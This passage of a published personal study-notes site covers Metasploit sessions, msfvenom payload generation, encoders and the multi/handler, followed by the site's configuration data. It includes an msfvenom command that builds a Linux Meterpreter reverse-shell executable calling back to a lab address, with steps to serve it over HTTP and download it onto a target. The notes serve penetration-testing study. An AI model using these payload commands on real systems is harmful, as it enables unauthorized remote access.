sessions.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eInteract with any existing session using the \u003ccode\u003esessions -i\u003c/code\u003e command followed by the session ID.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"msfvenom\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#msfvenom\"\u003e\u003c/a\u003eMsfvenom\u003c/h2\u003e\n\u003cp\u003eReplaces Msfpayload and Msfencode to generate payloads.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eMsfvenom will allow to access all payloads in the Metasploit framework.\u003c/li\u003e\n\u003cli\u003eMsfvenom allows to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"output-formats\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#output-formats\"\u003e\u003c/a\u003eOutput Formats\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eCan generate stand-alone payloads or get a usable raw format with \u003ccode\u003emsfvenom --list formats\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"encoders\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#encoders\"\u003e\u003c/a\u003eEncoders\u003c/h3\u003e\n\u003cp\u003eEncoders do not aim to bypass antivirus installed on the target system. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shell code is better solution to the problem.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUsage of encoding with \u003ccode\u003e-e\u003c/code\u003e parameter.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"handlers\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#handlers\"\u003e\u003c/a\u003eHandlers\u003c/h3\u003e\n\u003cp\u003eSimilar to exploits using a reverse shell, you will need to be able to accept incoming connections generated by the MSFvenom payload.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe term commonly used to receive a connection from a target is \"catching a shell\". Reverse shells or Meterpreter callbacks generated in the MSFvenom payload can be easily caught using a handler.\u003c/li\u003e\n\u003cli\u003eMulti handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.\u003c/li\u003e\n\u003cli\u003eMulti Handler to receive the incoming connections with \u003ccode\u003euse exploit/multi/handler\u003c/code\u003e command.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"other-payloads\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#other-payloads\"\u003e\u003c/a\u003eOther Payloads\u003c/h4\u003e\n\u003cp\u003eLinux Executable and Linkable Format (elf)\n\u003ccode\u003emsfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=10.13.40.171 LPORT=4444 -f elf \u003e rev_shell.elf\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eTransfer to the target machine by starting a Python web serer on attacking machine with \u003ccode\u003epython3 -m http.server 9000\u003c/code\u003e command. Then use wget to download it to the target machine (Linux)\u003c/p\u003e\n\u003ch2 id=\"summary\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#summary\"\u003e\u003c/a\u003eSummary\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eDatabase feature can help with penetration testing with multiple targets.\u003c/li\u003e\n\u003cli\u003eCreation of stand-alone Meterpreter payloads.\n\u003cul\u003e\n\u003cli\u003eHelpful in situations where we can upload a file to the target system or have the ability to download files to the target system.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eMeterpreter is a powerful tool that offers a lot of features during the post-exploitation phase.\u003c/li\u003e\n\u003c/ul\u003e","noteIndex":{"id":"3ipqfkgudo2s73dwa256ca0","title":"Brain","desc":"","updated":1654212603514,"created":1651706375099,"custom":{"nav_order":0,"permalink":"/"},"fname":"root","type":"note","vault":{"fsPath":"vault"},"contentHash":"a83b284bd096f5e390fe503b2b0b07c7","links":[{"type":"ref","from":{"fname":"root","id":"3ipqfkgudo2s73dwa256ca0","vaultName":"vault"},"value":"cybersecurity","position":{"start":{"line":5,"column":1,"offset":76},"end":{"line":5,"column":19,"offset":94},"indent":[]},"xvault":false,"to":{"fname":"cybersecurity"}}],"anchors":{"welcome-to-tysons-vault":{"type":"header","text":"Welcome to Tyson's Vault!","value":"welcome-to-tysons-vault","line":7,"column":0,"depth":1},"lookup":{"type":"header","text":"Lookup","value":"lookup","line":14,"column":0,"depth":2}},"children":["nkcab8fkftjfz927no2dyac","cl0utj7thwjp7bsmxe4v5va","o9kgllk4dy29wx2figqoz1w","5vhy4yxl34a7p6064a13u49","ce290z98noyy6eb5pniawk9","txeqnq5eaictderxvuifqr6","pn4fankyf3uifous1txqj5m","8ykaxd1qjsjfi1c6zsfq1eq","017vb349bxpq76wq69sai1u","wcuptt9dpzdx06nt9l6myuv","iulpmov883qv6tpqkgvbno8","8ml5picmbrjw3u887mag9dz","pd3512leoloo1qll6fr2j0o","e77elhqi5fhnpz5kdvxeudb","9k9gs0zqcs40mq2fsi5nesj","zegnyfq64amprq2yq9rnu3e","op8gluer5gorswd1xkdwwis","btat806wf3v71jpa11klryx","kldz5ejn1lvhsujdm2nyog7","9gc4nxd14um87nyud8e9ubt","ptonz0zapnutyahjkedfn8f","ixopv5geql8hlgkwk20pxow","3cschspue6elfiqxcd17tul","0f8xutu1gmbnw7xt51tim9v","87sb4tbzuopxpz736rwtx5b","d9ibeadgk68z3q2qjgsqida","woqkmy53oegpxi1ia3jl833","6ltznv32t1szgyl74knpxly","16md0j2hj1k5477uu3kclcb","2o3i5a96njb0vlfr61lslzi"],"parent":null,"data":{},"body":"# Welcome to Tyson's Vault!\n\nThis is my place store all my cool knowledge.\n\n![[cybersecurity]]\n\n\n## Lookup\n\nThis section contains useful links to related resources.\n\n- [Getting Started Guide](https://link.dendron.so/6b25)\n- [Discord](https://link.dendron.so/6b23)\n- [Home Page](https://wiki.dendron.so/)\n- [Github](https://link.dendron.so/6b24)\n- [Developer Docs](https://docs.dendron.so/)\n"},"collectionChildren":null,"customHeadContent":null,"config":{"version":5,"dev":{"enablePreviewV2":true},"commands":{"lookup":{"note":{"selectionMode":"extract","confirmVaultOnCreate":true,"vaultSelectionModeOnCreate":"smart","leaveTrace":false,"bubbleUpCreateNew":true,"fuzzThreshold":0.2}},"randomNote":{},"insertNote":{"initialValue":"templates"},"insertNoteLink":{"aliasMode":"none","enableMultiSelect":false},"insertNoteIndex":{"enableMarker":false},"copyNoteLink":{},"templateHierarchy":"template"},"workspace":{"vaults":[{"fsPath":"vault"}],"journal":{"dailyDomain":"daily","name":"journal","dateFormat":"y.MM.dd","addBehavior":"childOfDomain"},"scratch":{"name":"scratch","dateFormat":"y.MM.dd.HHmmss","addBehavior":"asOwnDomain"},"task":{"name":"","dateFormat":"","addBehavior":"childOfCurrent","statusSymbols":{"":" ","wip":"w","done":"x","assigned":"a","moved":"m","blocked":"b","delegated":"l","dropped":"d","pending":"y"},"prioritySymbols":{"H":"high","M":"medium","L":"low"},"todoIntegration":false,"createTaskSelectionType":"selection2link","taskCompleteStatus":["done","x"]},"graph":{"zoomSpeed":1,"createStub":false},"enableAutoCreateOnDefinition":false,"enableXVaultWikiLink":false,"enableRemoteVaultInit":true,"enableUserTags":true,"enableHashTags":true,"workspaceVaultSyncMode":"noCommit","enableAutoFoldFrontmatter":false,"enableEditorDecorations":true,"maxPreviewsCached":10,"maxNoteLength":204800,"enableFullHierarchyNoteTitle":false,"enableHandlebarTemplates":false,"templateHierarchy":"template","enableSmartRefs":true,"dendronVersion":"0.83.0"},"preview":{"theme":"dark","enableFMTitle":true,"enableNoteTitleForLink":true,"enableFrontmatterTags":true,"enableHashesForFMTags":false,"enableMermaid":true,"enablePrettyRefs":true,"enableKatex":true,"automaticallyShowPreview":false},"publishing":{"logoPath":"https://clipground.com/images/cyber-logo-3.jpg","theme":"dark","siteUrl":"https://tysonnguyen.github.io","assetsPrefix":"/IBM-cybersecurity","enableFMTitle":true,"enableNoteTitleForLink":true,"enableMermaid":true,"enablePrettyRefs":true,"enableKatex":true,"copyAssets":true,"siteHierarchies":["root"],"writeStubs":false,"siteRootDir":"docs","seo":{"title":"Cybersecurity","description":"Personal Knowledge Space"},"github":{"enableEditLink":true,"editLinkText":"Edit this page on GitHub","editBranch":"main","editViewMode":"tree","editRepository":"https://github.com/TysonNguyen/IBM-cybersecurity"},"enableSiteLastModified":true,"enableFrontmatterTags":true,"enableHashesForFMTags":false,"enableRandomlyColoredTags":true,"enablePrettyLinks":true,"duplicateNoteBehavior":{"action":"useVault","payload":["vault"]},"enableTaskNotes":true,"siteFaviconPath":"favicon.ico","siteIndex":"root"}}},"__N_SSG":true},"page":"/notes/[id]","query":{"id":"0kj8xnsfecw7wnis65jbzok"},"buildId":"NXb5WjKoAzTxCthMfgKQk","assetPrefix":"/IBM-cybersecurity","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>